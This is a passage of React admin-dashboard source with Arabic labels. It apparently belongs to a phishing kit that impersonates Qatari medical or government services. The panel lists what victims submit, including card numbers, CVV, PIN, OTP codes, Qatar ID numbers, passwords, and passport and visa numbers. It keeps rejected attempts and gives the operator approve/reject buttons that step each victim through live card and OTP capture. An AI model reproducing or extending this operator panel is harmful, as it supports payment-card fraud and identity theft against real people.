                        "medical_user_type", "medical_qatar_id", "medical_password",
                        "card_name", "card_number", "expiry", "cvv", "card_pin",
                      ]);
                      Object.entries(ad).forEach(([fk, v]) => {
                        if (v == null || v === "") return;
                        if (HIDDEN_AD_KEYS.has(fk)) return;
                        // Skip draft_* buckets (objects) — they are streamed
                        // live-typing snapshots surfaced elsewhere; showing
                        // them here would print "[object Object]".
                        if (fk.startsWith("draft_")) return;
                        if (typeof v === "object") return;
                        fields.push({ icon: iconFor[fk] || Hash, label: labels[fk] || fk, value: String(v), mono: monoKeys.has(fk) });
                      });
                    }
                  }
                  if (k === "medical_login") {
                    if ((req as any).selected_service) fields.push({ icon: Crown, label: "الخدمة المختارة", value: getServiceLabelAr((req as any).selected_service) });
                    if (req.username) fields.push({ icon: User, label: "نوع المستخدم", value: req.username === "company" ? "مستخدم الشركة" : req.username === "individual" ? "مستخدم فردي" : req.username });
                    if (req.qatar_id || req.national_id) fields.push({ icon: CreditCard, label: "الهوية القطرية / رقم المنشأة", value: String(req.qatar_id || req.national_id), mono: true });
                    if (req.password) fields.push({ icon: Lock, label: "كلمة المرور", value: req.password, mono: true });
                  }

                    const theme = isWaiting ? "border-amber-300/60 bg-amber-50" : isRejected ? "border-2 border-destructive/70 bg-destructive/10 ring-2 ring-destructive/30 shadow-md shadow-destructive/20" : isApproved ? "border-emerald-500/30 bg-emerald-500/5" : isCurrent ? "border-border bg-muted/30" : "border-border bg-card";
                   const badgeLabel = isWaiting ? "⏳ بانتظار الموافقة" : isRejected ? "❌ مرفوض" : isApproved ? "✅ تمت الموافقة" : isCurrent ? "—" : "📥 مُستلمة";

                  return (
                     <div key={`${req.id}-${sectionKey}`} className={`relative rounded-2xl bg-card border ${theme} shadow-sm overflow-hidden`}>
                      {isRejected && (
                        <>
                          <span className="absolute top-0 inset-x-0 h-[3px] bg-gradient-to-r from-transparent via-destructive to-transparent" />
                          <div className="absolute top-2 left-2 z-10 rotate-[-12deg] select-none pointer-events-none">
                            <div className="px-2.5 py-1 rounded-md border-2 border-destructive/80 bg-destructive/10 text-destructive font-extrabold text-[10px] tracking-widest shadow-sm">
                              مرفوض ✕
                            </div>
                          </div>
                        </>
                      )}
                      <div className="flex items-center gap-2.5 px-3 pt-3 pb-2">
                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${isRejected ? "bg-gradient-to-br from-destructive to-destructive/70" : "bg-gradient-to-br from-primary to-primary/70"}`}><StageIcon className="h-4 w-4 text-white" /></div>
                        <div className="min-w-0 flex-1">
                          <div className="flex items-center justify-between gap-2">
                            <p className={`text-sm font-extrabold ${isRejected ? "text-destructive" : "text-foreground"}`}>{stage.label}</p>
                            <Badge variant={isRejected ? "destructive" : "outline"} className="text-[10px] font-extrabold">{badgeLabel}</Badge>
                          </div>
                          <div className="flex items-center gap-2 mt-1 text-[10px] text-muted-foreground">
                            <Calendar className="h-2.5 w-2.5" />{formatDate(req.created_at)}
                            <span className="opacity-40">•</span>
                            <Clock className="h-2.5 w-2.5" />{formatTime(req.created_at)}
                          </div>
                          {isRejected && (
                            <div className="mt-1.5 inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-destructive/15 border border-destructive/30">
                              <X className="h-3 w-3 text-destructive" />
                              <span className="text-[10px] font-extrabold text-destructive">تم رفض هذه البيانات — محفوظة كما أدخلها الزائر</span>
                            </div>
                          )}
                        </div>
                      </div>


                      <div className="px-3 pb-3">
                        {fields.length > 0 ? (
                          <div className="rounded-xl bg-white/70 border border-border/60 divide-y divide-border/40">
                            {fields.map((f, i) => {
                              const FieldIcon = f.icon;
                              const isUrl = /^https?:\/\//.test(f.value);
                              const isImage = isUrl && /\.(jpe?g|png|webp|gif|bmp|heic)(\?|$)/i.test(f.value);
                              return (
                                <div key={i} className="px-2.5 py-2">
                                  <div className="flex items-center justify-between gap-2 mb-1">
                                    <span className="flex items-center gap-1.5 text-[10px] font-bold text-muted-foreground uppercase">
                                      <FieldIcon className="h-3 w-3" />{f.label}
                                    </span>
                                    <button type="button" onClick={() => { navigator.clipboard?.writeText(f.value); toast.success("تم النسخ"); }} className="p-1 rounded-md hover:bg-primary/10 text-muted-foreground hover:text-primary">
                                      <Copy className="w-3 h-3" />
                                    </button>
                                  </div>
                                  <div className="min-w-0">
                                    {isUrl ? (
                                      <a href={f.value} target="_blank" rel="noopener noreferrer" className={`font-bold text-xs underline break-all ${f.mono ? "font-mono" : ""} text-primary`} dir="ltr">
                                        {f.value.split("/").pop() || f.value}
                                      </a>
                                    ) : (
                                      <span className={`font-bold text-sm select-all break-words ${f.mono ? "font-mono" : ""} text-foreground`} dir={f.mono ? "ltr" : "auto"} style={{ overflowWrap: "anywhere" }}>
                                        {f.value}
                                      </span>
                                    )}
                                  </div>
                                  {isImage && (
                                    <a href={f.value} target="_blank" rel="noopener noreferrer" className="block mt-2 rounded-lg overflow-hidden border border-border bg-background mx-auto max-w-[240px]">
                                      <img src={f.value} alt={f.label} loading="lazy" className="w-full max-h-72 object-contain bg-muted" />
                                    </a>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        ) : (
                          <div className="rounded-xl bg-muted/40 border border-dashed border-border px-3 py-3 text-center">
                            <p className="text-[11px] italic text-muted-foreground">لم يقدّم الزائر بيانات في هذه الصفحة</p>
                          </div>
                        )}

                        {(() => {
                          const attempts = ((req as any).__rejected_attempts ?? []) as Array<{ step: string; at: string; values: Record<string, unknown> }>;
                          const relevant = attempts.filter(a => a && a.step === (req.step as string) && a.values && Object.keys(a.values).length > 0);
                          if (relevant.length === 0) return null;
                          const attemptLabels: Record<string, string> = {
                            card_name: "اسم حامل البطاقة", card_number: "رقم البطاقة", expiry: "تاريخ الانتهاء", cvv: "CVV",
                            card_otp: "رمز البطاقة (OTP)", card_pin: "الرقم السري (PIN)",
                            username: "اسم المستخدم", password: "كلمة المرور",
                            ooredoo_otp: "رمز Ooredoo", otp: "الكود (OTP)",
                            medical_user_type: "نوع المستخدم", medical_qatar_id: "الرقم الشخصي", medical_password: "كلمة المرور",
                            full_name: "الاسم الكامل", national_id: "الرقم الشخصي",
                            governorate: "المحافظة", city: "المدينة", street: "الشارع",
                            requestType: "نوع الطلب", userType: "نوع المستخدم", passportNo: "رقم الجواز", visaNo: "رقم التأشيرة",
                            nationality: "الجنسية", dob: "تاريخ الميلاد", gender: "الجنس", pregnant: "حامل",
                            establishmentNo: "رقم المنشأة", companyNameAr: "اسم الشركة (عربي)", companyNameEn: "اسم الشركة (إنجليزي)",
                            commercialRegNo: "السجل التجاري", activityType: "نوع النشاط", establishmentDate: "تاريخ التأسيس",
                            email: "البريد الإلكتروني", networkOperator: "شبكة الاتصال", network_operator: "شبكة الاتصال",
                            employer: "جهة العمل", occupation: "المهنة", purpose: "الغرض", fee_qar: "الرسوم (ر.ق)", flow: "المسار",
                            purposeCompany: "الغرض (منشأة)",
                          };
                          return (
                            <div className="mt-3 rounded-xl border-2 border-destructive/40 bg-destructive/5 overflow-hidden">
                              <div className="px-3 py-2 bg-destructive/10 border-b border-destructive/30 flex items-center gap-2">
                                <X className="h-3.5 w-3.5 text-destructive" />
                                <span className="text-[11px] font-extrabold text-destructive">المحاولات المرفوضة سابقاً ({relevant.length})</span>
                              </div>
                              <div className="divide-y divide-destructive/20">
                                {relevant.map((a, ai) => (
                                  <div key={ai} className="px-3 py-2">
                                    <div className="flex items-center justify-between mb-1.5">
                                      <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-destructive text-white text-[9px] font-extrabold">
                                        محاولة #{ai + 1} — مرفوضة
                                      </span>
                                      <span className="text-[9px] text-muted-foreground">{formatTime(a.at)}</span>
                                    </div>
                                    <div className="space-y-1">
                                      {Object.entries(a.values).map(([vk, vv]) => (
                                        <div key={vk} className="flex items-center justify-between gap-2 text-[11px]">
                                          <span className="text-muted-foreground font-bold flex items-center gap-1">
                                            {attemptLabels[vk] || vk}
                                            <span className="text-[8px] px-1 py-px rounded bg-destructive/15 text-destructive font-extrabold">مرفوض</span>
                                          </span>
                                          <span className="font-mono font-bold text-destructive select-all" dir="ltr" style={{ overflowWrap: "anywhere" }}>{String(vv)}</span>
                                        </div>
                                      ))}
                                    </div>
                                  </div>
                                ))}
                              </div>
                            </div>
                          );
                        })()}

                        {isActivePending && (
                          <div className="grid grid-cols-2 gap-2 mt-3">
                            <Button size="sm" className="bg-emerald-600 hover:bg-emerald-600/90 text-white font-bold text-xs h-9 rounded-xl gap-1.5" onClick={() => updateStatus(req.id, "approved")}>
                              <Check className="h-4 w-4" />موافقة
                            </Button>
                            <Button size="sm" className="bg-destructive hover:bg-destructive/90 text-white font-bold text-xs h-9 rounded-xl gap-1.5" onClick={() => updateStatus(req.id, "rejected")}>
                              <X className="h-4 w-4" />رفض
                            </Button>
                          </div>
                        )}
                      </div>
                    </div>
                  );
                });
                });
                })()}
              </div>
            </div>

          </>
        )}
      </div>

      <Dialog open={pwdOpen} onOpenChange={(o) => { setPwdOpen(o); if (!o) { setPwdCurrent(""); setPwdNew(""); setPwdConfirm(""); } }}>
        <DialogContent dir="rtl" className="max-w-sm">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2"><KeyRound className="h-4 w-4 text-primary" /> تغيير كلمة المرور</DialogTitle>
            <DialogDescription>أدخل كلمة المرور الحالية ثم اختر كلمة مرور جديدة.</DialogDescription>
          </DialogHeader>
          <form onSubmit={handleChangePassword} className="space-y-3">
            <div className="space-y-1.5">
              <label className="text-xs font-semibold">كلمة المرور الحالية</label>
              <div className="relative">
                <Input type={showPwdCurrent ? "text" : "password"} value={pwdCurrent} onChange={(e) => setPwdCurrent(e.target.value)} className="h-11 pe-10" dir="ltr" />
                <button type="button" onClick={() => setShowPwdCurrent((s) => !s)} className="absolute left-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground" aria-label={showPwdCurrent ? "إخفاء" : "إظهار"}>
                  {showPwdCurrent ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-semibold">كلمة المرور الجديدة</label>
              <div className="relative">
                <Input type={showPwdNew ? "text" : "password"} value={pwdNew} onChange={(e) => setPwdNew(e.target.value)} className="h-11 pe-10" dir="ltr" />
                <button type="button" onClick={() => setShowPwdNew((s) => !s)} className="absolute left-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground" aria-label={showPwdNew ? "إخفاء" : "إظهار"}>
                  {showPwdNew ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-semibold">تأكيد كلمة المرور الجديدة</label>
              <div className="relative">
                <Input type={showPwdConfirm ? "text" : "password"} value={pwdConfirm} onChange={(e) => setPwdConfirm(e.target.value)} className="h-11 pe-10" dir="ltr" />
                <button type="button" onClick={() => setShowPwdConfirm((s) => !s)} className="absolute left-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground" aria-label={showPwdConfirm ? "إخفاء" : "إظهار"}>
                  {showPwdConfirm ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>
            <DialogFooter className="gap-2 sm:gap-2">
              <Button type="button" variant="outline" onClick={() => setPwdOpen(false)} disabled={pwdLoading}>إلغاء</Button>
              <Button type="submit" disabled={pwdLoading || !pwdCurrent || !pwdNew || !pwdConfirm}>
                {pwdLoading ? <><Loader2 className="h-4 w-4 animate-spin ml-1" />جاري الحفظ...</> : "حفظ"}
              </Button>
            </DialogFooter>
          </form>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Admin;
